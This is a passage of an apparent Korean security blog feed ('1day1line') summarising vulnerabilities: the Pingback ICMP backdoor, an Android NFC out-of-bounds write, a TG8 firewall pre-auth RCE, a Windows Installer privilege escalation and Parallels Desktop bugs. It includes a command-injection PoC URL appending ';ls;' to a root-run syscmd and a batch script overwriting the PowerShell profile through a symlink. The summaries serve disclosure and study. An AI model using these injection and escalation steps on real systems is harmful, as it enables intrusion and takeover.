&#xC720;&#xC9C0;&#xD569;&#xB2C8;&#xB2E4;. &#xB610;&#xD55C; msdtc&#xB97C; &#xC2DC;&#xC791; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC73C;&#xB85C; &#xC124;&#xC815;&#xD558;&#xAE30; &#xC704;&#xD574; SYSTEM &#xAD8C;&#xD55C;&#xC744; &#xD544;&#xC694;&#xB85C; &#xD558;&#xBA70; &#xBA40;&#xC6E8;&#xC5B4;&#xB97C; &#xC124;&#xCE58;&#xD560; &#xB54C; <a href="https://docs.microsoft.com/ko-kr/windows-server/administration/windows-commands/sc-config">SC Command</a>&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xC5EC; &#xC708;&#xB3C4;&#xC6B0; &#xC2DC;&#xC2A4;&#xD15C; &#xB514;&#xB809;&#xD130;&#xB9AC;&#xC5D0; <code>oci.dll</code>&#xB97C; &#xC124;&#xCE58;&#xD558;&#xACE0; msdtc&#xB97C; &#xC2DC;&#xC791; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC73C;&#xB85C; &#xB4F1;&#xB85D;&#xD569;&#xB2C8;&#xB2E4;.</p><p><code>oci.dll</code>&#xC740; &#xD1B5;&#xC2E0;&#xC5D0; <a href="https://ko.wikipedia.org/wiki/%EC%9D%B8%ED%84%B0%EB%84%B7_%EC%A0%9C%EC%96%B4_%EB%A9%94%EC%8B%9C%EC%A7%80_%ED%94%84%EB%A1%9C%ED%86%A0%EC%BD%9C">ICMP(Internet Control Message Protocol)</a>&#xC744; &#xC0AC;&#xC6A9;&#xD569;&#xB2C8;&#xB2E4;. ICMP&#xB294; &#xB124;&#xD2B8;&#xC6CC;&#xD06C; &#xACC4;&#xCE35; &#xD504;&#xB85C;&#xD1A0;&#xCF5C;&#xB85C; ICMP &#xD328;&#xD0B7;&#xACFC; &#xC5F0;&#xACC4;&#xB418;&#xB294; TCP, UDP &#xD3EC;&#xD2B8; &#xBC88;&#xD638;&#xAC00; &#xC874;&#xC7AC;&#xD558;&#xC9C0; &#xC54A;&#xC544; <code>netstat</code>&#xC5D0;&#xC11C; &#xD1B5;&#xC2E0;&#xC744; &#xC228;&#xAE38; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>ICMP &#xD504;&#xB85C;&#xD1A0;&#xCF5C;&#xC744; &#xD1B5;&#xD574; &#xD1B5;&#xC2E0;&#xC744; &#xD558;&#xAE30; &#xC704;&#xD574; <a href="https://en.wikipedia.org/wiki/ICMP_tunnel">ICMP &#xD130;&#xB110;&#xB9C1;</a>&#xC744; &#xC0AC;&#xC6A9;&#xD569;&#xB2C8;&#xB2E4;. IPv4 &#xB124;&#xD2B8;&#xC6CC;&#xD06C;&#xC5D0;&#xC11C; ICMP &#xD328;&#xD0B7;&#xC740; IPv4 &#xD5E4;&#xB354;, ICMP &#xD5E4;&#xB354;, ICMP &#xB370;&#xC774;&#xD130;&#xB85C; &#xAD6C;&#xC131;&#xB418;&#xC5B4; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. Type 8 (Echo, ping) ICMP &#xBA54;&#xC2DC;&#xC9C0;&#xB97C; &#xC804;&#xC1A1;&#xD558;&#xC5EC; &#xBA85;&#xB839;&#xC744; &#xC218;&#xD589;&#xD558;&#xBA70; &#xD328;&#xD0B7; &#xB370;&#xC774;&#xD130; &#xD615;&#xC2DD;&#xC740; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs cpp"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ICMPData</span> {</span><span class="hljs-keyword">char</span> cmd[<span class="hljs-number">10</span>];    <span class="hljs-comment">// bot command</span><span class="hljs-keyword">char</span> args[<span class="hljs-number">512</span>];  <span class="hljs-comment">// extra parameter</span><span class="hljs-keyword">char</span> cmd_line[<span class="hljs-number">258</span>];  <span class="hljs-comment">// command line</span><span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> dest_port; <span class="hljs-comment">// destination port</span><span class="hljs-keyword">char</span> dest_addr[<span class="hljs-number">4</span>];  <span class="hljs-comment">// destination IP address</span>}</code></pre><p>Pingback&#xC5D0;&#xC11C; &#xC9C0;&#xC6D0;&#xD558;&#xB294; &#xBA85;&#xB839;&#xC5B4;&#xB294; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ul><li><strong>shell</strong> - &#xC258; &#xC2E4;&#xD589;</li><li><strong>download</strong> - 3&#xAC1C;&#xC758; &#xBAA8;&#xB4DC;&#xAC00; &#xC874;&#xC7AC;<ul><li>Mode 1: &#xD574;&#xCEE4;&#xC758; &#xD638;&#xC2A4;&#xD2B8;&#xC5D0; &#xAC10;&#xC5FC;&#xB41C; PC&#xB97C; &#xB2E4;&#xC2DC; &#xC5F0;&#xACB0;</li><li>Mode 2: &#xAC10;&#xC5FC;&#xB41C; PC&#xAC00; &#xC9C0;&#xC815;&#xB41C; &#xD3EC;&#xD2B8;&#xC5D0; &#xC18C;&#xCF13;&#xC744; &#xC5F4;&#xACE0; &#xD574;&#xCEE4;&#xC758; &#xC5F0;&#xACB0;&#xC744; &#xAE30;&#xB2E4;&#xB9BC;</li><li>Mode 3: ICMP &#xAE30;&#xBC18;&#xC73C;&#xB85C; &#xB9E4;&#xC6B0; &#xB290;&#xB9AC;&#xACE0; &#xD604;&#xC7AC; &#xAD6C;&#xD604; &#xC0C1; flow control&#xC744; &#xC2E0;&#xB8B0;&#xD560; &#xC218; &#xC5C6;&#xC74C;</li></ul></li><li><strong>upload</strong> - &#xB2E4;&#xC6B4;&#xB85C;&#xB4DC; &#xBA85;&#xB839;&#xACFC; &#xBE44;&#xC2B7;&#xD558;&#xAC8C; 3&#xAC1C;&#xC758; &#xBAA8;&#xB4DC;&#xB97C; &#xC9C0;&#xC6D0;&#xD568;</li><li><strong>exec</strong> - &#xAC10;&#xC5FC;&#xB41C; PC&#xC5D0;&#xC11C; &#xBA85;&#xB839;&#xC5B4;&#xB97C; &#xC2E4;&#xD589;&#xD568;</li></ul>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>windows</tag>
      
      <tag>malware</tag>
      
      <tag>idioth</tag>
      
      <tag>icmp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] Android OOB write in NFC stack</title>
    <link href="/2021/05/05/fabu1ous/2021-05-05/"/>
    <url>/2021/05/05/fabu1ous/2021-05-05/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=2144">OOB Write in NFC stack when handling MIFARE Classic TLVs</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a><strong>Target</strong></h2><p>Android-10</p><p>Android-11</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a><strong>Explain</strong></h2><p>&#xC545;&#xC131; NFC &#xD328;&#xD0B7;&#xC744; &#xD1B5;&#xD55C; &#xC548;&#xB4DC;&#xB85C;&#xC774;&#xB4DC; RCE &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xACAC;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC548;&#xB4DC;&#xB85C;&#xC774;&#xB4DC; NFC&#xB294; &#xD568;&#xC218;<code>rw_mfc_handle_read_op()</code>&#xB97C; &#xC0AC;&#xC6A9;&#xD574;  &#xBE14;&#xB85D; &#xB2E8;&#xC704; &#xC694;&#xCCAD;&#xC744; &#xBCF4;&#xB0B4;&#xACE0; MFC(MIFARE Classic) &#xCE74;&#xB4DC;&#xB85C;&#xBD80;&#xD130; NDEF(NFC Data Exchange Format)&#xB97C; &#xBC1B;&#xC544;&#xC635;&#xB2C8;&#xB2E4;. &#xD568;&#xC218; <code>rw_mfc_handle_read_op()</code> &#xB294; STATE&#xC5D0; &#xB530;&#xB77C; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC774; &#xB3D9;&#xC791;&#xD569;&#xB2C8;&#xB2E4;.</p><ol><li><p>RW_MFC_STATE_DETECT_TLV</p><p>&#xBE14;&#xB85D;&#xC758; TLV&#xB97C; &#xD30C;&#xC2F1;&#xD574;  <code>p_mfc-&gt;ndef_length</code>&#xAC12;&#xC744; &#xC800;&#xC7A5;&#xD558;&#xACE0; &#xADF8;&#xC5D0; &#xB9DE;&#xB294; &#xBC84;&#xD37C;&#xB97C; &#xD560;&#xB2F9;&#xD569;&#xB2C8;&#xB2E4;.</p></li><li><p>RW_MFC_STATE_READ_NDEF</p><p>&#xBE14;&#xB85D;&#xC758; TLV&#xB97C; &#xB2E4;&#xC2DC; &#xB514;&#xCF54;&#xB529;&#xD574; <code>p_mfc-&gt;ndef_length</code>&#xAC12;&#xC744; &#xC5C5;&#xB370;&#xC774;&#xD2B8;&#xD55C; &#xB4A4; &#xBC84;&#xD37C;&#xC5D0; &#xB370;&#xC774;&#xD130;&#xB97C; &#xBCF5;&#xC0AC;&#xD569;&#xB2C8;&#xB2E4;.</p></li></ol><p>&#xC545;&#xC131; NFC &#xD328;&#xD0B7;&#xC744; &#xD1B5;&#xD574; &#xB450; STATE&#xC5D0;&#xC11C; &#xC11C;&#xB85C; &#xB2E4;&#xB978; <code>p_mfc-&gt;ndef_length</code>&#xAC12;&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xB3C4;&#xB85D; &#xC720;&#xB3C4;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB530;&#xB77C;&#xC11C; buffer overflow&#xAC00; &#xBC1C;&#xC0DD;&#xD560; &#xC218; &#xC788;&#xC73C;&#xBA70; &#xC774;&#xB97C; &#xC545;&#xC6A9;&#xD574; &#xC6D0;&#xACA9; &#xCF54;&#xB4DC; &#xC2E4;&#xD589; &#xACF5;&#xACA9;&#xC744; &#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>android</tag>
      
      <tag>rce</tag>
      
      <tag>nfc</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] TG8 Firewall의 PreAuth 원격 코드실행 취약점</title>
    <link href="/2021/05/04/l0ch/2021-05-04/"/>
    <url>/2021/05/04/l0ch/2021-05-04/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://ssd-disclosure.com/ssd-advisory-tg8-firewall-preauth-rce-and-password-disclosure/">SSD Advisory &#x2013; TG8 Firewall PreAuth RCE and Password Disclosure</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>TG8 Firewall</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p><a href="http://www.tg8security.com/firewall.html">TG8 Security</a> &#xC0AC;&#xC758; &#xBC29;&#xD654;&#xBCBD;&#xC5D0;&#xC11C; &#xC778;&#xC99D;&#xB418;&#xC9C0; &#xC54A;&#xC740; root &#xAD8C;&#xD55C;&#xC758; &#xC6D0;&#xACA9; &#xCF54;&#xB4DC; &#xC2E4;&#xD589; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xACAC;&#xB418;&#xC5B4; &#xC138;&#xBD80; &#xC815;&#xBCF4;&#xAC00; &#xACF5;&#xAC1C;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xCDE8;&#xC57D;&#xC810;&#xC740; &#xC778;&#xC99D; &#xC694;&#xCCAD;&#xC744; &#xCC98;&#xB9AC;&#xD558;&#xB294; <code>index.php</code> &#xC5D0; &#xC874;&#xC7AC;&#xD558;&#xBA70; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs php">...  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">checkLogin</span>(<span class="hljs-params"></span>) </span>{    <span class="hljs-keyword">var</span> username = $(<span class="hljs-string">&apos;input[name=u]&apos;</span>).val();    <span class="hljs-keyword">var</span> pass = $(<span class="hljs-string">&apos;input[name=p]&apos;</span>).val();    <span class="hljs-keyword">var</span> cmd = <span class="hljs-string">&apos;sudo /home/TG8/v3/syscmd/check_gui_login.sh &apos;</span> + username + <span class="hljs-string">&apos; &apos;</span> + pass;    $.ajax({      url: <span class="hljs-string">&quot;runphpcmd.php&quot;</span>,      type: <span class="hljs-string">&quot;post&quot;</span>,      dataType: <span class="hljs-string">&quot;json&quot;</span>,      cache: <span class="hljs-string">&quot;false&quot;</span>,      data: {        syscmd: cmd      },      success: <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">x</span>) </span>{        <span class="hljs-keyword">if</span> (x == <span class="hljs-string">&apos;OK&apos;</span>) {          ok(username);        } <span class="hljs-keyword">else</span> {          failed();        }      },      <span class="hljs-built_in">error</span>: <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) </span>{      ok(username);        <span class="hljs-comment">// alert(&quot;failure to excute the command&quot;);</span>      }    })  }...</code></pre><p>&#xC778;&#xC99D; &#xC694;&#xCCAD;&#xC744; &#xBC1B;&#xC73C;&#xBA74; &#xB85C;&#xADF8;&#xC778;&#xC744; &#xCC98;&#xB9AC;&#xD558;&#xB294; <code>check_gui_login.sh</code> &#xC5D0; <code>username</code>&#xACFC; <code>pass</code>&#xB97C; &#xB9E4;&#xAC1C;&#xBCC0;&#xC218;&#xB85C; &#xBA85;&#xB839;&#xC744; &#xAD6C;&#xC131;&#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xB294; <code>runphpcmd.php</code> &#xC758; <code>syscmd</code>&#xB85C; &#xC804;&#xB2EC;&#xB418;&#xACE0; root &#xAD8C;&#xD55C;&#xC73C;&#xB85C; <code>check_gui_login.sh</code>&#xAC00; &#xC2E4;&#xD589;&#xB429;&#xB2C8;&#xB2E4;. &#xADF8;&#xB7EC;&#xB098;  <code>syscmd</code>&#xC5D0; &#xB300;&#xD55C; &#xC5B4;&#xB5A0;&#xD55C; &#xAC80;&#xC0AC;&#xB3C4; &#xC874;&#xC7AC;&#xD558;&#xC9C0; &#xC54A;&#xC544; &#xD574;&#xCEE4;&#xAC00; &#xC784;&#xC758;&#xC758; &#xCF54;&#xB4DC;&#xB97C; &#xD3EC;&#xD568;&#xD55C; <code>syscmd</code>&#xB97C; &#xB9E4;&#xAC1C;&#xBCC0;&#xC218;&#xB85C; <code>runphpcmd.php</code>&#xC5D0; &#xC9C1;&#xC811; &#xC694;&#xCCAD;&#xD558;&#xBA74; &#xC6D0;&#xACA9; &#xCF54;&#xB4DC; &#xC2E4;&#xD589;&#xC774; &#xD2B8;&#xB9AC;&#xAC70; &#xB429;&#xB2C8;&#xB2E4;. </p><p>root &#xAD8C;&#xD55C;&#xC73C;&#xB85C; <code>ls</code> &#xBA85;&#xB839;&#xC5B4;&#xB97C; &#xC2E4;&#xD589;&#xD558;&#xB294; PoC&#xB294; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c">http:<span class="hljs-comment">//&lt;server&gt;/admin/runphpcmd.php?syscmd=sudo+%2Fhome%2FTG8%2Fv3%2Fsyscmd%2Fcheck_gui_login.sh+%3Bls%3B++local</span></code></pre><p>&#xC81C;&#xBCF4;&#xC790;&#xB294; &#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810; &#xC678;&#xC5D0;&#xB3C4; &#xC561;&#xC138;&#xC2A4; &#xAD8C;&#xD55C; &#xC124;&#xC815; &#xBBF8;&#xD761;&#xC73C;&#xB85C; &#xC778;&#xD574; &#xC778;&#xC99D;&#xB418;&#xC9C0; &#xC54A;&#xC740; &#xC0AC;&#xC6A9;&#xC790;&#xAC00; <code>/data/</code> &#xB514;&#xB809;&#xD130;&#xB9AC;&#xC758; &#xC790;&#xACA9; &#xC99D;&#xBA85; &#xD30C;&#xC77C;&#xC5D0; &#xC811;&#xADFC;&#xD560; &#xC218; &#xC788;&#xB294; &#xC815;&#xBCF4;&#xC720;&#xCD9C; &#xCDE8;&#xC57D;&#xC810; &#xB610;&#xD55C; &#xBC1C;&#xACAC;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC774;&#xB97C; &#xD574;&#xB2F9; &#xBC29;&#xD654;&#xBCBD; &#xC7A5;&#xBE44;&#xC758; &#xACF5;&#xAE09; &#xC5C5;&#xCCB4;&#xC778; TG8&#xC5D0;&#xAC8C; SNS &#xBC0F; &#xC774;&#xBA54;&#xC77C;&#xC744; &#xD1B5;&#xD574; &#xC5EC;&#xB7EC; &#xCC28;&#xB840; &#xC81C;&#xBCF4;&#xD558;&#xC600;&#xC73C;&#xB098; &#xACF5;&#xAE09; &#xC5C5;&#xCCB4;&#xB85C;&#xBD80;&#xD130; &#xC5B4;&#xB5A0;&#xD55C; &#xC751;&#xB2F5;&#xB3C4; &#xBC1B;&#xC9C0; &#xBABB;&#xD588;&#xB2E4;&#xACE0; &#xBC1D;&#xD614;&#xC73C;&#xBA70;, &#xD574;&#xB2F9; &#xC7A5;&#xBE44;&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xACE0; &#xC788;&#xB2E4;&#xBA74; &#xC989;&#xC2DC; &#xC678;&#xBD80; &#xC778;&#xD130;&#xB137;&#xC73C;&#xB85C; &#xD1B5;&#xD558;&#xB294; &#xD3EC;&#xD2B8;&#xB97C; &#xCC28;&#xB2E8;&#xD560; &#xAC83;&#xC744; &#xAC15;&#xB825;&#xD558;&#xAC8C; &#xAD8C;&#xACE0;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>rce</tag>
      
      <tag>pre-auth</tag>
      
      <tag>L0ch</tag>
      
      <tag>firewall</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2021-26415: Microsoft Installer Local Privilege Escalation</title>
    <link href="/2021/05/03/idioth/2021-05-03/"/>
    <url>/2021/05/03/idioth/2021-05-03/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://www.cloaked.pl/2021/04/cve-2021-26415/">CVE-2021-26415</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Microsoft Windows Installer</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Microsoft Windows Installer(MSI)&#xC5D0;&#xC11C; TOCTOU&#xC640; symlink&#xB97C; &#xD1B5;&#xD55C; Local Privilege Escalation &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xACAC;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. <code>msiexec</code>&#xB294; &#xAE30;&#xBCF8;&#xC801;&#xC73C;&#xB85C; &#xAD00;&#xB9AC;&#xC790; &#xAD8C;&#xD55C;&#xC744; &#xD544;&#xC694;&#xB85C; &#xD558;&#xC9C0;&#xB9CC; repair operation &#xC218;&#xD589;&#xC744; &#xC704;&#xD574; <code>/f</code> &#xC635;&#xC158;&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xBA74; &#xAD8C;&#xD55C;&#xC774; &#xC5C6;&#xC774; &#xC0AC;&#xC6A9;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. <code>/L</code> &#xC635;&#xC158;&#xACFC; &#xD568;&#xAED8; &#xC0AC;&#xC6A9;&#xD558;&#xBA74; &#xB85C;&#xADF8; &#xD30C;&#xC77C;&#xC744; &#xC9C0;&#xC815;&#xB41C; &#xACF3;&#xC5D0; &#xC0DD;&#xC131;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs taggerscript">msiexec /f C:<span class="hljs-symbol">\W</span>indows<span class="hljs-symbol">\I</span>nstaller<span class="hljs-symbol">\1</span>48d3c4.msi /L C:<span class="hljs-symbol">\t</span>emp<span class="hljs-symbol">\f</span>oo.log</code></pre><p>symlink&#xB97C; &#xD1B5;&#xD574; <code>foo.log</code>&#xAC00; &#xCCAB; CreatFile&#xC5D0;&#xC11C; &#xC2DC;&#xC2A4;&#xD15C; &#xAD8C;&#xD55C;&#xC73C;&#xB85C; impersnation &#xB420; &#xB54C; oplock&#xC744; &#xC124;&#xCE58;&#xD558;&#xBA74; &#xB2E4;&#xC74C; &#xC4F0;&#xAE30;/&#xC77D;&#xAE30; &#xC791;&#xC5C5;&#xC740; &#xC2EC;&#xBCFC;&#xB9AD; &#xB9C1;&#xD06C;&#xB41C; &#xD30C;&#xC77C;&#xC5D0;&#xC11C; &#xC218;&#xD589;&#xB429;&#xB2C8;&#xB2E4;. PowerShell&#xC744; Overwrite&#xD558;&#xC5EC; LPE&#xB97C; &#xD558;&#xB294; POC&#xB294; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs latex">@echo offREM Put BaitAndSwitch, example.msi into C:<span class="hljs-tag">\<span class="hljs-name">temp</span></span>echo &gt; C:<span class="hljs-tag">\<span class="hljs-name">temp</span></span><span class="hljs-tag">\<span class="hljs-name">fakelog</span></span>.txtstart C:<span class="hljs-tag">\<span class="hljs-name">temp</span></span><span class="hljs-tag">\<span class="hljs-name">BaitAndSwitch</span></span> C:<span class="hljs-tag">\<span class="hljs-name">temp</span></span><span class="hljs-tag">\<span class="hljs-name">linkdir</span></span><span class="hljs-tag">\<span class="hljs-name">link</span></span> C:<span class="hljs-tag">\<span class="hljs-name">temp</span></span><span class="hljs-tag">\<span class="hljs-name">fakelog</span></span>.txt C:<span class="hljs-tag">\<span class="hljs-name">Windows</span></span><span class="hljs-tag">\<span class="hljs-name">System</span></span>32<span class="hljs-tag">\<span class="hljs-name">WindowsPowerShell</span></span><span class="hljs-tag">\<span class="hljs-name">v</span></span>1.0<span class="hljs-tag">\<span class="hljs-name">profile</span></span>.ps1timeout /t 1msiexec /j C:<span class="hljs-tag">\<span class="hljs-name">temp</span></span><span class="hljs-tag">\<span class="hljs-name">example</span></span>.msi /t ksz /Li! C:<span class="hljs-tag">\<span class="hljs-name">temp</span></span><span class="hljs-tag">\<span class="hljs-name">linkdir</span></span><span class="hljs-tag">\<span class="hljs-name">link</span></span> /qn</code></pre>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>lpe</tag>
      
      <tag>microsoft</tag>
      
      <tag>toctou</tag>
      
      <tag>idioth</tag>
      
      <tag>msi</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] Two CVEs in Parallels Desktop RDPMC</title>
    <link href="/2021/05/01/fabu1ous/2021-05-01/"/>
    <url>/2021/05/01/fabu1ous/2021-05-01/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://www.zerodayinitiative.com/blog/2021/4/26/parallels-desktop-rdpmc-hypercall-interface-and-vulnerabilities">PARALLELS DESKTOP RDPMC HYPERCALL INTERFACE AND VULN</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a><strong>Target</strong></h2><p>Parallels Desktop 15.1.5 (Guest)</p><p>macOS Caltalina 10.15.7 (Host)</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a><strong>Explain</strong></h2><p>Parallels Desktop&#xC5D0;&#xC11C; hypercall &#xC778;&#xD130;&#xD398;&#xC774;&#xC2A4;&#xB97C; &#xD1B5;&#xD574; Guest &#xC720;&#xC800;&#xAC00; Host &#xCEE4;&#xB110;&#xC5D0;&#xC11C; &#xC784;&#xC758; &#xCF54;&#xB4DC;&#xB97C; &#xC2E4;&#xD589;&#xD560; &#xC218; &#xC788;&#xB294; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xACAC;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. Parallels Desktop&#xC740; RDPMC(Read Performance-Monitor Counter) instruction&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xB294; hypercall &#xC778;&#xD130;&#xD398;&#xC774;&#xC2A4;&#xB97C; &#xD1B5;&#xD574; guest&#xC640; host&#xC758; &#xD1B5;&#xC2E0;&#xC744; &#xC9C0;&#xC6D0;&#xD569;&#xB2C8;&#xB2E4;. &#xD574;&#xB2F9; &#xC778;&#xD130;&#xD398;&#xC774;&#xC2A4;&#xB294; guest &#xC720;&#xC800; &#xAD8C;&#xD55C;&#xC73C;&#xB85C;&#xB3C4; &#xC811;&#xADFC;&#xD560; &#xC218; &#xC788;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; host VMM(Virtual Machine Monitor)&#xC758; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xD2B8;&#xB9AC;&#xAC70;&#xD574; &#xAD8C;&#xD55C; &#xC0C1;&#xC2B9;&#xC774; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;.</p><ul><li><p>CVE-2021-31424 : Heap overflow</p><p>host VMM&#xC740; guest&#xC640; &#xB370;&#xC774;&#xD130;&#xB97C; &#xC8FC;&#xACE0;&#xBC1B;&#xC744; &#xB54C; <code>ReadLinear()</code>&#xC640; <code>WriteLinear()</code>&#xB97C; &#xC0AC;&#xC6A9;&#xD569;&#xB2C8;&#xB2E4;. guest &#xC720;&#xC800;&#xAC00; &#xC81C;&#xC5B4;&#xD560; &#xC218; &#xC788;&#xB294; &#xB370;&#xC774;&#xD130;(UEFI variable name)&#xC5D0; &#xB300;&#xD55C; &#xAE38;&#xC774; &#xAC80;&#xC99D; &#xBBF8;&#xD761;&#xC73C;&#xB85C; &#xC778;&#xD574; &#xD574;&#xB2F9; &#xB370;&#xC774;&#xD130;&#xB97C; &#xBCF5;&#xC0AC;&#xD558;&#xB294; &#xACFC;&#xC815;&#xC5D0;&#xC11C; Heap overflow&#xAC00; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">uint64_t</span> <span class="hljs-title">OTGHandleGenericCommand</span><span class="hljs-params">(<span class="hljs-keyword">uint64_t</span> x)</span> </span><span class="hljs-function"></span>{           <span class="hljs-comment">/* case 9 */</span>         MonReadLinear(regs.rsi, &amp;request, <span class="hljs-number">0x30</span>);          SharedMem-&gt;EFIVar.op = request.op;          ReadLinear(request.name, SharedMem-&gt;EFIVar.name, <span class="hljs-number">2</span> * request.size);        <span class="hljs-comment">// heap overflow when copying variable name from guest </span>        SharedMem-&gt;EFIVar.name[request.size] = <span class="hljs-number">0</span>;        ...</code></pre></li></ul><ul><li><p>CVE-2021-31427 : TOCTOU</p><p>guest&#xC5D0; &#xBCF4;&#xB0B4;&#xC57C; &#xD560; &#xB370;&#xC774;&#xD130;&#xC758; &#xD06C;&#xAE30; &#xAC12;(<code>EFIVar.datasize</code>) &#xAC80;&#xC99D;&#xC740; user space&#xC5D0;&#xC11C; &#xC774;&#xB8E8;&#xC5B4;&#xC9D1;&#xB2C8;&#xB2E4;. VMM&#xACFC; userspace &#xC0AC;&#xC774; &#xCEE8;&#xD2B8;&#xB864; &#xC704;&#xC784;&#xC744; &#xB2F4;&#xB2F9;&#xD558;&#xB294; &#xD568;&#xC218; <code>MonRetToHostSwitch()</code>&#xC640; &#xACF5;&#xC720; &#xBA54;&#xBAA8;&#xB9AC;&#xB85C;&#xBD80;&#xD130;  <code>EFIVar.datasize</code>&#xB97C; &#xBCF5;&#xC0AC;&#xD574;&#xC624;&#xB294; &#xD568;&#xC218; <code>WriteLinear()</code> &#xC0AC;&#xC774;&#xC5D0;&#xC11C; race condition&#xC774; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;. &#xB370;&#xC774;&#xD130; &#xAE38;&#xC774; &#xAC80;&#xC99D;&#xACFC; &#xB370;&#xC774;&#xD130; &#xBCF5;&#xC0AC; &#xC791;&#xC5C5; &#xC0AC;&#xC774;&#xC5D0; <code>EFIVar.datasize</code>&#xAC12;&#xC744; &#xBC88;&#xACBD;&#xD558;&#xB294; &#xAC83;&#xC774; &#xAC00;&#xB2A5;&#xD558;&#xBBC0;&#xB85C; host kernel &#xB370;&#xC774;&#xD130;&#xC5D0; &#xB300;&#xD55C; OOB(out-of-bound) read&#xB85C; &#xC774;&#xC5B4;&#xC9C8; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.  </p></li></ul>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>mac</tag>
      
      <tag>Fabu1ous</tag>
      
      <tag>race condition</tag>
      
      <tag>heap overflow</tag>
      
      <tag>parallels</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2021-25319: VirtualBox의 권한상승 취약점</title>
    <link href="/2021/04/30/l0ch/2021-04-30/"/>
    <url>/2021/04/30/l0ch/2021-04-30/</url>
    
